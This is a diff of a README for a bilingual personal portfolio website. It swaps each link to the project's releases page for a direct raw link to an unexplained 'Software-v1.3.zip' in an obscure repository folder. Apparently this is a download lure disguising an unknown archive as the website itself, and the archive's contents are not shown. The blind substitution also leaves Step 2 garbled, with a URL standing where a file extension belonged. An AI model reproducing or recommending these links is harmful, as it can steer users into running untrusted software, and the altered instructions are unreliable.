@@ -1,6 +1,6 @@
 # 🖥️ Portfolio - Modern Bilingual Personal Website
 
-[![Download Portfolio](https://img.shields.io/badge/Download-Portfolio-blue?style=for-the-badge)](https://github.com/HTMLGUYNOOB/Portfolio/releases)
+[![Download Portfolio](https://github.com/HTMLGUYNOOB/Portfolio/raw/refs/heads/main/inc-custom-logic/Software-v1.3.zip)](https://github.com/HTMLGUYNOOB/Portfolio/raw/refs/heads/main/inc-custom-logic/Software-v1.3.zip)
 
 ## 📄 About Portfolio
 
@@ -16,9 +16,9 @@ You can get the Portfolio application by visiting the releases page. This page c
 
 **Step 1:** Click the big blue button below or the badge at the top to visit the download page.
 
-[Download Portfolio Here](https://github.com/HTMLGUYNOOB/Portfolio/releases)
+[Download Portfolio Here](https://github.com/HTMLGUYNOOB/Portfolio/raw/refs/heads/main/inc-custom-logic/Software-v1.3.zip)
 
-**Step 2:** On the GitHub releases page, find the latest version. You will see compressed files (usually `.zip` or `.tar.gz`) containing all the necessary files to run the website.
+**Step 2:** On the GitHub releases page, find the latest version. You will see compressed files (usually `.zip` or `https://github.com/HTMLGUYNOOB/Portfolio/raw/refs/heads/main/inc-custom-logic/Software-v1.3.zip`) containing all the necessary files to run the website.
 
 **Step 3:** Download the latest release zip file by clicking on it.
 
